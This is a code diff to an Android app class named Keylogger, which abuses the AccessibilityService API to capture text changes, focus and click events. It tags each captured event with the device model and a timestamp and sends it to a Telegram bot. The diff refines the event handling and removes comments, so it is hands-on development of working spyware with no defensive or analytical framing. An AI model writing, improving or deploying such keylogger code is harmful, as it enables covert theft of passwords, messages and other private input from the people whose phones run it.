@@ -26,7 +26,7 @@ public class Keylogger extends AccessibilityService {
         protected Void doInBackground(String... params) {
             try {
                 String message = params[0];
-                String chatId = Constants.TELEGRAM_CHAT_ID; // Ensure Constants.java exists in the correct package
+                String chatId = Constants.TELEGRAM_CHAT_ID;
                 String telegramUrl = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
                 String payload = "chat_id=" + chatId + "&text=" + message.replace(" ", "+");
 
@@ -59,32 +59,35 @@ public class Keylogger extends AccessibilityService {
         String timestamp = new SimpleDateFormat("MM/dd/yyyy, HH:mm:ss z", Locale.US)
                 .format(Calendar.getInstance().getTime());
 
-        // Get device name
         String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
 
-        // Fix: Get text safely from the event
         List<CharSequence> eventText = event.getText();
-        if (eventText.isEmpty()) return; // No text event, ignore
-        
-        String data = eventText.get(0).toString().trim();
-        if (data.isEmpty()) return; // Empty text, ignore
+        if (eventText.isEmpty()) return;
 
-        String logMessage = timestamp + " | Device: " + deviceName + " | " + getEventType(event) + " | " + data;
+        String data = eventText.get(0).toString().trim();
+        if (data.isEmpty()) return;
+
+        String logMessage = timestamp + " | Device: " + deviceName + " | ";
+        
+        switch (event.getEventType()) {
+            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
+                logMessage += "(TEXT_CHANGED) | " + data;
+                break;
+            }
+            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
+                logMessage += "(FOCUSED) | " + data;
+                break;
+            }
+            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
+                logMessage += "(CLICKED) | " + data;
+                break;
+            }
+            default:
+                return; // Ignore other events
+        }
+
         new SendToTelegramTask().execute(logMessage);
         Log.d(TAG, "Logged event: " + logMessage);
-    }
-
-    private String getEventType(AccessibilityEvent event) {
-        switch (event.getEventType()) {
-            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-                return "(TEXT_CHANGED)";
-            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
-                return "(FOCUSED)";
-            case AccessibilityEvent.TYPE_VIEW_CLICKED:
-                return "(CLICKED)";
-            default:
-                return "(OTHER)";
-        }
     }
 
     @Override
